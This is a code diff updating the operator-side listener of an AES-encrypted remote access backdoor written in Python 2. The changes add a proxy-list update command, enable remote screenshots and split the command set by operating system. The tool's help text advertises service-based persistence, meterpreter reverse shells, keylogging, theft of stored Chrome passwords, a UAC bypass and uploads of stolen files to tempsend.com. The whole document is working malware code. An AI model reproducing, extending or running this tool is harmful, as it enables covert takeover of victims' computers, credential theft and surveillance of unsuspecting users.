@@ -64,6 +64,12 @@ def fnextcmd():
 			encrypted = EncodeAES(cipher, "persistence")
 			s.send(encrypted)
 
+	elif nextcmd.startswith('proxyupdate '):
+		proxfile = nextcmd.split(' ')[1]
+		with open(proxfile, 'rb') as pl:
+			encrypted = EncodeAES(cipher, 'proxyupdate' + pl.read() + 'EOPL')
+		s.sendall(encrypted)
+
 	elif nextcmd.startswith('upload '):
 		upfile = nextcmd.split(' ')[1]
 		ufilename = upfile.split(os.sep)[-1]
@@ -74,7 +80,7 @@ def fnextcmd():
 			try:
 				paddedfilename = ufilename + '*' * (16 - len(ufilename))
 				with open(upfile, 'rb') as f:
-					encrypted = EncodeAES(cipher, "EOFEOFEOFEOFEOFS" + paddedfilename + f.read() + "EOFEOFEOFEOFEOFZ")
+					encrypted = EncodeAES(cipher, "EOFEOFEOFEOFEOFSEOFEOFEOFEOFEOFS" + paddedfilename + f.read() + "EOFEOFEOFEOFEOFZEOFEOFEOFEOFEOFZ")
 				s.send(encrypted)
 			except:
 				print ' [X] Error, %s not found!**n' % (upfile)
@@ -84,10 +90,10 @@ def fnextcmd():
 		print fhelp()
 		fnextcmd()
 
-	# elif nextcmd.startswith('screenshot'):
-	# 	downfile = 'screenshot_%s.bmp' % (random.randint(100,9999))
-	# 	encrypted = EncodeAES(cipher, nextcmd)
-	# 	s.send(encrypted)
+	elif nextcmd.startswith('screenshot'):
+		downfile = 'screenshot_%s.bmp' % (random.randint(100,9999))
+		encrypted = EncodeAES(cipher, nextcmd)
+		s.send(encrypted)
 
 	elif nextcmd.startswith('download '):
 		downfile = nextcmd.split(' ')[1].split(os.sep)[-1].split('\\\\')[-1]
@@ -101,8 +107,6 @@ def fnextcmd():
 def fmainloop(first):											## This loop is used to accept a new connection
 	global iv, cipher, s, address
 	if first:
-		print ' [>] Listening for connection on %s' % (listenport)
-		print ' [>] AES secret: %s' % (secret)
 		while True:
 			iv = Random.new().read(AES.block_size)
 			cipher = AES.new(secret,AES.MODE_CFB, iv)
@@ -124,14 +128,12 @@ def fmainloop(first):											## This loop is used to accept a new connection
 				continue
 
 def fhelp():
-	return '**n AES-shell options:**n  download file       -  Download a file from remote pwd to localhost.**n  upload filepath     -  Upload a filepath to remote pwd.**n  run commands        -  Run a command in the background.**n  wget url            -  Download a file from url to remote pwd.**n  tempsend file       -  Upload a file from remote pwd to tempsend.com**n**n Windows Only:**n  persistence         -  Install exe as a system service backdoor.**n  meterpreter ip:port -  Execute a reverse_tcp meterpreter to ip:port.**n  keyscan             -  Start recording keystrokes.**n  keydump             -  Dump recorded keystrokes.**n  keyclear            -  Clear the keystroke buffer.**n  chromepass          -  Retrieve chrome, chromium and aviator stored passwords.**n  bypassuac cmds      -  Run commands as admin.**n'
+	if isWindows:
+		return '**n AES-shell options:**n  download file       -  Download a file from remote pwd to localhost.**n  upload filepath     -  Upload a filepath to remote pwd.**n  run commands        -  Run a command in the background.**n  wget url            -  Download a file from url to remote pwd.**n  tempsend file       -  Upload a file from remote pwd to tempsend.com**n**n Windows Only:**n  persistence         -  Install exe as a system service backdoor.**n  meterpreter ip:port -  Execute a reverse_tcp meterpreter to ip:port.**n  keyscan             -  Start recording keystrokes.**n  keydump             -  Dump recorded keystrokes.**n  keyclear            -  Clear the keystroke buffer.**n  chromepass          -  Retrieve chrome, chromium and aviator stored passwords.**n  bypassuac cmds      -  Run commands as admin.**n  screenshot          -  Take a screenshot of the remote desktop.**n  proxyupdate file    -  Update proxy list from file.**n'
+	else:
+		return '**n AES-shell options:**n  download file       -  Download a file from remote pwd to localhost.**n  upload filepath     -  Upload a filepath to remote pwd.**n  run commands        -  Run a command in the background.**n  wget url            -  Download a file from url to remote pwd.**n  tempsend file       -  Upload a file from remote pwd to tempsend.com**n'
 
-commands = ['download ', 'upload ', 'meterpreter ', 'keyscan', 'keydump', 'keyclear', 'run ', 'chromepass', 'help', 'bypassuac ', 'persistence', 'wget ', 'tempsend ']
-try:
-	readline.parse_and_bind("tab: complete")
-	readline.set_completer(completer)
-except:
-	pass
+
 BLOCK_SIZE, PADDING, cfrom, pwd = 32, '{', ' ', ''
 pad = lambda s: s + (BLOCK_SIZE - len(s) % BLOCK_SIZE) * PADDING
 EncodeAES = lambda c, s: base64.b64encode(c.encrypt(s))
@@ -141,6 +143,8 @@ isAdmin, is64, isSystem, isProxied, isWindows, newpwd = False, False, False, Fal
 iv = Random.new().read(AES.block_size)
 cipher = AES.new(secret,AES.MODE_CFB, iv)
 c = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+print ' [>] Listening for connection on %s' % (listenport)
+print ' [>] AES secret: %s' % (secret)
 try:
 	c.bind(('0.0.0.0', int(sys.argv[1])))
 except:	
@@ -151,7 +155,7 @@ fmainloop(True)
 
 while True:
 	try:
-		data = s.recv(2048)
+		data = s.recv(8192)
 		if data.startswith("GET / HTTP/1.1**r**n**r**n"):		## Check if host is connecting through proxy
 			data = data[18:]
 			isProxied = True
@@ -164,7 +168,7 @@ while True:
 			checkpath = decrypted.split('**n')[-2].strip('**n').strip('**r')
 			if '[X]' not in checkpath and '[*]' not in checkpath:
 				if isWindows:
-					if '\\' in checkpath.strip('**r'):
+					if '\\' in checkpath.strip('**r') and ':' in checkpath.strip('**r'):
 						pwd = checkpath.strip('**r')
 						newpwd = True
 				else:
@@ -179,8 +183,12 @@ while True:
 		fnextcmd()
 
 	elif decrypted.endswith('***^^'):
-		encrypted = EncodeAES(cipher, nextcmd)
-		s.send(encrypted)
+		if not nextcmd.startswith('upload'):
+			encrypted = EncodeAES(cipher, nextcmd)
+			s.send(encrypted)
+		else:
+			encrypted = EncodeAES(cipher, 'donaught')
+			s.send(encrypted)
 
 	elif decrypted.endswith('*' * 16):							## Get system info
 		opsys = decrypted[64:128].strip('*')
@@ -209,6 +217,16 @@ while True:
 		if isProxied:
 			cfrom = ' (Proxy)'
 
+		if isWindows:
+			commands = ['download ', 'upload ', 'meterpreter ', 'keyscan', 'keydump', 'keyclear', 'run ', 'chromepass', 'help', 'bypassuac ', 'persistence', 'wget ', 'tempsend ', 'screenshot', 'proxyupdate ']
+		else:
+			commands = ['download ', 'upload ', 'wget ', 'tempsend ', 'run ']
+		try:
+			readline.parse_and_bind("tab: complete")
+			readline.set_completer(completer)
+		except:
+			pass
+
 		print ' [*] AES-Encrypted connection established with %s:%s%s' % (address[0], address[1], cfrom)
 		print ' [*] User is %s, System is %s %s.**n' % (uservar, archvar, opsys)
 		fnextcmd()
@@ -217,14 +235,19 @@ while True:
 		try:
 			print ' [*] %s received.**n' % (downfile)
 			f = open(downfile, 'wb')
-			f.write(decrypted[32:])
-			while not decrypted.endswith("EOFEOFEOFEOFEOFZ"):
-				data = s.recv(2048)
-				decrypted = DecodeAES(cipher, data)
-				if decrypted.endswith("EOFEOFEOFEOFEOFZ"):
-					f.write(decrypted[:-32])
-				else:
-					f.write(decrypted)
+			decrypted = decrypted[32:]
+			if decrypted.endswith('EOFEOFEOFEOFEOFZ'):
+				decrypted = decrypted[:-32]
+				f.write(decrypted)
+			else:
+				f.write(decrypted)
+				while not decrypted.endswith("EOFEOFEOFEOFEOFZ"):
+					data = s.recv(8192)
+					decrypted = DecodeAES(cipher, data)
+					if decrypted.endswith("EOFEOFEOFEOFEOFZ"):
+						f.write(decrypted[:-32])
+					else:
+						f.write(decrypted)
 			f.close()
 			fnextcmd()
 		except Exception as e:
@@ -236,8 +259,11 @@ while True:
 		fnextcmd()
 
 	else:														## Print the normal output
-		if decrypted:
+		if all(c in string.printable for c in decrypted):
 			print decrypted
+		else:
+			print ' [X] Decryption Error from %s!' % (address[0])
+			#exit()
 	try:
 		if nextcmd == 'exit' or nextcmd == 'quit':
 			c.close()
